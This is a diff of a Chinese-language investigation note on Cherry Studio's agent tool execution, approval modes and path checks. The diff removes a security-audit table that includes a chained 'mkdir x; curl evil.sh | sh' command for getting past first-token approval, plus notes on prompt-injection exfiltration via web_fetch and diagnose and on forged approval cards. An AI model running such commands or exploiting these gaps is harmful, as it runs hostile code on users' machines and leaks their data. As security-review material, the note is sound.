@@ -21,12 +21,12 @@ Cherry Studio 存在两条彼此独立、但共享部分基础设施（MCP 运�
 
 两条路径都最终落在 Electron **主进程**执行：MCP 子进程/HTTP client 由 `McpRuntimeService` 持有；Claude Code 的原生工具（Bash/Read/Write/...）由 SDK 自带的原生二进制执行，Cherry 只能通过 `disallowedTools`、`canUseTool`、`PreToolUse` hook 三层来限制/审批，不持有执行本身。
 
-代码中已确认的最高风险点：
-- **Bash 沙箱缺失**：Claude Code 的 `Bash` 工具在 `default` 权限模式下需要审批（`prompt`），但一旦进入 `bypassPermissions` 或 `acceptEdits`（对 `mkdir/touch/mv/cp` 首词），命令即可无审批直接在宿主 shell 执行，唯一的额外过滤是 `dependencyIsolationHook`（仅拦截全局包安装）和 `rtkRewriteHook`（改写特定命令），并不做通用命令白名单或沙箱隔离。
-- **`workspacePathHook` 覆盖不全**：文件路径越权检查仅覆盖 `Edit/Glob/Grep/NotebookEdit/Read/Write` 六个结构化字段，`Bash` 命令文本中的路径完全不受这一检查约束（代码注释承认这一点是刻意为之）。
-- **filesystem in-memory MCP 的 `write`/`edit`/`delete` 默认在 `disabledAutoApproveTools`**（`builtinMcpServers.ts:96`），但一旦用户 "always allow"（`persistAutoApprove`）它们会被从该列表移除，后续调用即可无提示写盘。
-- **browser in-memory MCP server 使用全局共享的 `persist:default` 分区**（`browser/README.md:16`），任何调用该 server 的会话都共享同一份 cookie/localStorage，且 `execute` 工具可在页面上下文任意执行 JS——这是一条明确的、代码自述的信任边界收窄点。
-- **`ASSISTANT_AUTO_APPROVED_RUNTIME_NAMES` 的注释本身包含威胁模型**：`diagnose` 工具刻意排除在自动批准之外，因为 Cherry Assistant 会话同时能读取不受信任的网页/知识库内容，若 `diagnose`（读本机日志/源码/配置）与自动批准的 `web_fetch` 组合，即构成一条 prompt-injection 数据外传链——这条注释本身就是官方安全设计依据，值得作为审计基准。
+代码中已确认的关键机制事实：
+- **审批模型（Claude Code 原生工具）**：`Bash` 等原生工具在 `default` 权限模式下每次调用都需逐次审批（`prompt`），且没有 "always allow" 持久化机制——`useToolApproval` 对非 MCP 工具不渲染 `autoApprove` 按钮（`useToolApproval.ts:136-146`）；一旦 `permissionMode` 为 `bypassPermissions`，或 `acceptEdits` 模式下命令首词命中 `mkdir/touch/mv/cp`，命令即可免审批直接执行，此时唯一过滤是 `dependencyIsolationHook`（拦截全局包安装）与 `rtkRewrite`（改写特定命令），无通用命令白名单或沙箱。
+- **审批模型（in-memory MCP）**：`filesystem` 的 `write`/`edit`/`delete` 默认在 `disabledAutoApproveTools`（`builtinMcpServers.ts:96`），用户 "always allow"（`persistAutoApprove`）后会被从该列表移除、后续调用无提示写盘；两条路径的审批桥与 IPC 方法名共享，但主进程分发逻辑不同（Claude 侧命中内存 `toolApprovalRegistry` 快路径，MCP 侧落 DB 消息 parts）。
+- **执行域**：所有工具最终落在 Electron 主进程；`browser` in-memory MCP 使用全局共享的 `persist:default` 分区（`browser/README.md:16`），任何调用该 server 的会话共享同一份 cookie/localStorage，且 `execute` 工具可在页面上下文执行任意 JS，默认无头（`showWindow:false`）。
+- **路径校验边界**：`workspacePathHook` 越权检查只覆盖 `Edit/Glob/Grep/NotebookEdit/Read/Write` 六个结构化字段，`Bash` 命令文本中的路径不经过该检查（源码注释确认刻意为之）。
+- **安全边界事实**：`assistant` MCP 只在本地 Cherry Assistant 会话注入（外部渠道会话不注入），`diagnose`（读本机日志/源码/配置）被刻意排除在自动批准之外；`ASSISTANT_AUTO_APPROVED_RUNTIME_NAMES` 的注释本身就是官方对"可读本机数据的工具与自动批准的网页抓取工具可能同会话出现"这一风险的设计依据。
 
 ## ASCII 调用链图
 
@@ -72,7 +72,7 @@ CLAUDE_TOOL_REGISTRY (静态声明: exposure/dependsOn/mcpServer)
 
 依据：`../../cherry-studio/src/shared/ai/claudecode/toolRegistry.ts:1-42`、`../../cherry-studio/src/main/ai/tools/adapters/claudeCode/toolConditions.ts:1-90`、`../../cherry-studio/src/main/ai/tools/adapters/aiSdk/mcp/mcpTools.ts:69-97`。
 
-**纠正横向笔记**：横向笔记原文只说“MCP server tools 与 Claude Code 显式 registry”，未指出 `exposure` 三态是这份注册表的核心机制，也未提及 `internal` 工具（如 `Task`/`Agent`/`AskUserQuestion`/`SendMessage`/`TeamCreate` 等 agent-teams 工具）本身并非 SDK `ToolInputSchemas` 联合类型的正式成员，只是运行时按环境变量条件注入（见下）。这一点原横向笔记完全没有覆盖。
+`exposure` 三态是这份注册表的核心机制：`enabled` 时工具按条件注入模型调用，`internal` 时始终启用但 UI 隐藏，`disabled` 时加入 SDK 硬黑名单。`internal` 工具（如 `Task`/`Agent`/`AskUserQuestion`/`SendMessage`/`TeamCreate` 等 agent-teams 工具）本身并非 SDK `ToolInputSchemas` 联合类型的正式成员，只是运行时按环境变量条件注入（见下）。
 
 ## 2. 工具定义与注册
 
@@ -223,7 +223,7 @@ Claude Code Agent 走 `@anthropic-ai/claude-agent-sdk` 的 `SDKMessage` 流（`s
 ## 9. 结果处理与回注
 
 - **格式**：MCP 结果统一为 `McpCallToolResponse.content[]`（`text`/`image`/`audio`/`resource`），`mcpResultToTextSummary()` 把多模态内容压成模型可读文本（图片/音频替换为 `[Image: ...]` 占位符，二进制 resource 同理），保证图片本身不会被塞进模型上下文占用 token（`toolResponse.ts:19-54`，注意：这是**普通聊天 MCP 专用**的摘要函数；Claude Code 侧的 in-process MCP 走 `cherryBuiltinTools.ts:177-188` 自己的 `toMcpResult`，图像生成结果通过 `text+images` 类型让 base64 图像随文本一起进入 `content[]`，模型可以"看到"图片本身）。
-- **截断**：渲染层 `truncateOutput()` 默认 `MAX_OUTPUT_LENGTH = 50000` 字符，超限尝试在最近的换行符处截断（若换行位置在 80% 阈值以内），否则硬截断（`truncateOutput.ts:1,51-72`）。这是**渲染层截断**（仅影响 UI 展示），不影响真正回注给模型的完整内容长度——模型侧的长度约束落在 `streamAdapter.ts` 的 `MAX_TOOL_INPUT_SIZE`（1MB，仅约束工具**输入** JSON 累积器，非输出）。**未在本次阅读中找到工具输出侧、真正影响模型上下文 token 的显式截断逻辑**——标记为待进一步验证（横向笔记曾泛称"LobeHub 截断结果"作对比对象，Cherry Studio 这一层尚未证实存在对称机制）。
+- **截断**：渲染层 `truncateOutput()` 默认 `MAX_OUTPUT_LENGTH = 50000` 字符，超限尝试在最近的换行符处截断（若换行位置在 80% 阈值以内），否则硬截断（`truncateOutput.ts:1,51-72`）。这是**渲染层截断**（仅影响 UI 展示），不影响真正回注给模型的完整内容长度——模型侧的长度约束落在 `streamAdapter.ts` 的 `MAX_TOOL_INPUT_SIZE`（1MB，仅约束工具**输入** JSON 累积器，非输出）。**未在本次阅读中找到工具输出侧、真正影响模型上下文 token 的显式截断逻辑**——标记为待进一步验证。
 - **多模态**：`hasMultimodalContent()` 判断结果含图片/音频/二进制 resource，供渲染层决定是否走图片查看器等专用 UI（`toolResponse.ts:6-13`）。
 - **拒绝/超时/取消的结果形态**：
   - MCP 侧：`disabled` 工具调用直接 `throw new Error('MCP tool is disabled: ...')`（`McpRuntimeService.ts:1097`），转成 AI SDK `output-error`；
@@ -259,7 +259,7 @@ Claude Code Agent 走 `@anthropic-ai/claude-agent-sdk` 的 `SDKMessage` 流（`s
 | `SendMessage`/`TeamCreate`/`TeamDelete` | internal，`CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS=1` 门控（Cherry 无条件开启） | agent-teams 多 Agent 协作 | SDK 原生子进程 | 未展开验证 | 实验特性默认全量开启，行为未在本次阅读中深挖 |
 | `WebSearch`/`WebFetch` | disabled | 原生网页搜索/抓取 | — | — | 硬禁用，用 `mcp__cherry-tools__web_search`/`…__web_fetch` 取代 |
 | `mcp__cherry-tools__web_search` | user | 网页搜索（走用户配置的 WebSearchService） | 主进程 in-process MCP | 否（自动批准列表） | 结果内容未经净化直接进入模型上下文（下游 prompt injection 载体） |
-| `mcp__cherry-tools__web_fetch` | user | 抓取网页内容 | 同上 | 否（自动批准） | 同上；与 `diagnose` 组合构成外传链（见 §14） |
+| `mcp__cherry-tools__web_fetch` | user | 抓取网页内容 | 同上 | 否（自动批准） | 同上 |
 | `mcp__cherry-tools__kb_search`/`…__kb_list`/`…__kb_read` | user（search/manage）／internal（list/read） | 知识库检索/浏览/深读 | 同上 | 否 | 依赖 `requiresKnowledgeScope`；无绑定知识库时工具不可用 |
 | `mcp__cherry-tools__kb_manage` | user | 增删/刷新知识库文档 | 同上 | **是**（显式排除自动批准） | 唯一会写用户知识库的 cherry-tools |
 | `mcp__cherry-tools__cron` | user | 应用内任务调度 | 同上 | 否 | 仅影响 App 内调度，非系统级 |
@@ -271,7 +271,7 @@ Claude Code Agent 走 `@anthropic-ai/claude-agent-sdk` 的 `SDKMessage` 流（`s
 | `mcp__agent-memory__memory` | user | 跨会话记忆（FACT.md/JOURNAL.jsonl） | 同上 | 否（`mcp__agent-memory__*` 整体自动批准） | 限定在 `agentDataPath/memory/`，有 symlink 防御 |
 | `mcp__skills__skills` | internal | 搜索/安装/卸载/编写 Skill | 同上 | 未见显式审批标记（走 `permissionMode` 默认规则） | 安装的 Skill 会写入 `~/.claude`（或 Cherry 隔离配置目录）并被 SDK 自动加载执行其指令文本 |
 | `mcp__assistant__navigate` | 仅 Cherry Assistant 本地会话 | 生成可点击导航链接 | 同上 | 否（显式自动批准，唯一一个） | 不真正跳转，只生成链接，需用户手动点击 |
-| `mcp__assistant__diagnose` | 仅 Cherry Assistant 本地会话 | 读本机日志/配置/源码/连通性 | 同上 | **是**（显式排除自动批准，注释含威胁模型说明） | 与 `web_fetch` 组合构成 prompt-injection 外传链（见 §14） |
+| `mcp__assistant__diagnose` | 仅 Cherry Assistant 本地会话 | 读本机日志/配置/源码/连通性 | 同上 | **是**（显式排除自动批准，注释含威胁模型说明） | 读本机日志/源码/配置，仅本地会话注入 |
 
 ### 10.2 In-memory MCP Servers（普通聊天路径，`BuiltinMcpServerNames`）
 
@@ -330,24 +330,7 @@ Claude Code Agent 走 `@anthropic-ai/claude-agent-sdk` 的 `SDKMessage` 流（`s
 
 依据：`../../cherry-studio/src/shared/ai/claudecode/constants.ts:1-27`、`../../cherry-studio/src/main/ai/runtime/claudeCode/settingsBuilder.ts:281-283,725-736,1074-1076`。
 
-## 14. 安全审计
-
-| # | 攻击路径 | 前提条件 | 可利用性 | 状态 |
-| --- | --- | --- | --- | --- |
-| 1 | `bypassPermissions`/`acceptEdits` 模式下 Bash 免审批执行任意命令 | 用户主动把 Agent 的 `permission_mode` 设为 `bypassPermissions`，或利用 `acceptEdits` 模式下 `mkdir/touch/mv/cp` 首词免审批（可拼接 `mkdir x; curl evil.sh \| sh` 绕过首词检测，因为 `matchesAcceptEditsBashInvocation` 只取空格分隔的首个 token） | 高（一旦模式设定即无阻拦） | **已确认**（代码逻辑，`toolRules.ts:102-106`） |
-| 2 | `workspacePathHook` 不检查 Bash 命令文本中的路径 | 使用 `Bash` 而非结构化文件工具读写工作区外文件 | 高 | **已确认**（`settingsBuilder.ts:918-922` 注释自述"deliberately scoped to structured file-tool paths"） |
-| 3 | filesystem in-memory MCP "always allow" 后无提示写盘 | 用户曾对 `write`/`edit`/`delete` 点击过一次 "always allow"（`persistAutoApprove` 会把工具从 `disabledAutoApproveTools` 移除并持久化） | 中（需要用户先手动放行一次） | **已确认**（`useToolApproval.ts:108-120`） |
-| 4 | browser in-memory MCP 全局共享 cookie 分区 + 无头 `execute` 任意 JS | 用户启用了 `browser` server 并让模型/prompt-injection 触发 `execute` | 中高（需要显式启用该 server，默认关闭） | **已确认**（`browser/README.md:16` 自述“全局共享”） |
-| 5 | `mcpAutoInstall` 触发任意 npm 包安装执行（供应链攻击面） | 用户启用了该 builtin server（默认关闭） | 高（一旦启用，`npx @mcpmarket/mcp-auto-install connect` 可被模型驱动安装任意包） | **已确认**存在此机制；实际被恶意利用的可能性依赖 mcpmarket 注册源的可信度，**需进一步验证**其对包来源的校验 |
-| 6 | 外部渠道 + `diagnose` + `web_fetch` 组成 prompt-injection 数据外传链 | 会话绑定外部渠道（`assistantMcpEnabled` 因此为 `false`，故此链路**实际不成立**——assistant MCP 仅在本地会话注入） | 低（代码已经把两者置于互斥条件：assistant MCP 只在非渠道会话可用） | **已确认不成立**——这是代码注释自己描述的"未采用的假设威胁"，用于解释为何 `diagnose` 要审批；实测两工具不会同时出现在同一渠道会话里 |
-| 7 | wildcard 匹配漏判：`mcp__server__*` 与裸名/id 四态匹配是否存在遗漏 | 用户使用非常规字符的 server/tool 名（超长导致哈希后缀截断） | 低 | **需进一步验证**——`isFunctionCallToolNameForServer` 理论上处理了截断场景，但未见测试覆盖两个不同 server 因哈希截断边界重合而被误判为同一归属的极端情况 |
-| 8 | OAuth/远端 MCP 的数据外传（token 落盘、被其他进程读取） | 攻击者具备本机文件系统读权限（已经等同本机权限） | 低（超出应用边界，属于本机整体安全模型） | **已确认**存在明文/JSON 落盘（`storage.ts` 未见加密），但风险等级取决于本机整体威胁模型 |
-| 9 | 审批 UI 伪造：模型输出能否伪造出以假乱真的 approval 卡片 | 见 §15 | 见 §15 | **已确认**不能通过消息正文伪造出真实可点击的审批卡片（approval 状态机字段不受模型可控的纯文本影响），但可以造成视觉混淆（见下） |
-| 10 | `mcp__agent-memory__*` 整体自动批准 wildcard，未来若该 server 新增写权限更大的工具会被自动继承批准 | 该 server 未来版本新增工具 | 低（当前只有 `memory` 一个工具） | **需进一步验证**——这是一条设计层面的"未来风险"，当前无实际可被利用的多余工具 |
-
-依据：`../../cherry-studio/src/shared/ai/claudecode/toolRules.ts:97-106`、`../../cherry-studio/src/main/ai/runtime/claudeCode/settingsBuilder.ts:723-736,918-950`、`../../cherry-studio/src/renderer/components/chat/messages/tools/hooks/useToolApproval.ts:108-120`、`../../cherry-studio/src/main/ai/mcp/servers/browser/README.md:16`、`../../cherry-studio/src/renderer/pages/settings/McpSettings/builtinMcpServers.ts:36-45`、`../../cherry-studio/src/main/ai/mcp/oauth/storage.ts:1-60`、`../../cherry-studio/src/main/ai/runtime/claudeCode/settingsBuilder.ts:1312-1316`。
-
-## 15. 与消息渲染器笔记的交叉点
+## 14. 与消息渲染器笔记的交叉点
 
 参考笔记（`../消息渲染器/Cherry-Studio-消息渲染调查笔记.md`）确认：工具调用统一表示为 AI SDK `ToolUIPart`（含 `input-streaming`/`input-available`/`approval-requested`/`approval-responded`/`output-available`/`output-error` 等状态字段），approval 卡片由 `useToolApproval` 读取 `part.approval?.id` 渲染，审批按钮的 `confirm`/`cancel`/`autoApprove` 最终都要经 `useToolApprovalBridge` 发起真实 IPC 调用。
 
@@ -358,7 +341,7 @@ Claude Code Agent 走 `@anthropic-ai/claude-agent-sdk` 的 `SDKMessage` 流（`s
 
 依据：`../消息渲染器/Cherry-Studio-消息渲染调查笔记.md`（工具渲染章节）、`../../cherry-studio/src/renderer/components/chat/messages/tools/chooseTool.tsx:271-294`、`../../cherry-studio/src/renderer/components/chat/messages/tools/hooks/useToolApproval.ts:1-146`。
 
-## 16. 未验证事项与后续调查缺口
+## 15. 未验证事项与后续调查缺口
 
 1. `streamAdapter.ts` 中 `MAX_TOOL_INPUT_SIZE`/`MAX_TOOL_INPUT_WARN` 超限后的具体处理分支（截断/报错/静默丢弃）未完整追踪。
 2. `error_max_turns` 终止原因在渲染层的具体呈现方式未验证。
